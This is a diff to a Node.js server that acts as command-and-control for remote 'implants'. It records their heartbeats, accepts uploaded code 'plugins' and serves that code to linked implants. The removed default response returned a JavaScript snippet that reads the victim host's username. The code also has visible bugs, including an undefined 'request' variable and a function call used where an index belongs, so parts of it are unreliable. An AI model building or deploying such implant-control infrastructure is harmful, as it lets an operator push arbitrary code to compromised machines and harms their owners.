@@ -13,18 +13,19 @@ var implants = {}
 var known_plugins = {}
 
 const requestListener = function (req, res) {
-    if (!(request.method == 'POST')) {
+    if (!(req.method == 'POST')) {
         res.writeHead("501");
         res.end("Must use POST");
     } else {
         var body = '';
-        request.on('data', function (data) {
+        req.on('data', function (data) {
             body += data;
             if (body.length > 1e6)
                 request.connection.destroy();
         });
-        request.on('end', function () {
-            var post = qs.parse(body);
+        req.on('end', function () {
+            var post = JSON.parse(body);
+            console.log(post);
             switch (req.url) {
                 case "/":
                     if (!(IN in post)) {
@@ -37,7 +38,8 @@ const requestListener = function (req, res) {
                         }
                         implants[post[IN]]["LastKnownHeartBeat"] = new Date();
                         res.writeHead(200);
-                        res.end(implants[post[IN]][PL]);
+                        res.end(JSON.stringify(implants[post[IN]][PL]));
+                        console.log(implants);
                     }
                     break
                 case "/plugin/":
@@ -46,7 +48,7 @@ const requestListener = function (req, res) {
                         res.end("Plugin or implant not found. Please correct.")
                     } else {
                         res.writeHead(200);
-                        res.end(known_plugins[post[PN]]);
+                        res.end(JSON.stringify(known_plugins[post[PN]]));
                     }
                     break
                 case "/addplugin/":
@@ -56,7 +58,7 @@ const requestListener = function (req, res) {
                     }
                     known_plugins[post[PN]] = post[PC];
                     res.writeHead(200);
-                    res.end("OK");
+                    res.end("['OK']");
                     break
                 case "/linkimplantplugin/":
                     if (!(IN in post) || !(PN in post) || !(post[PN] in known_plugins) || !(post[IN] in implants)) {
@@ -65,12 +67,12 @@ const requestListener = function (req, res) {
                     } else {
                         implants[post[IN]][PL].push(post(PN));
                         res.writeHead(200);
-                        res.end("OK");
+                        res.end("['OK']");
                     }
                     break
                 default:
-                    res.writeHead(200);
-                    res.end("const os = require('node:os');console.log(os.userInfo().username);");
+                    res.writeHead(404);
+                    res.end("[]");
             }
         });
     }
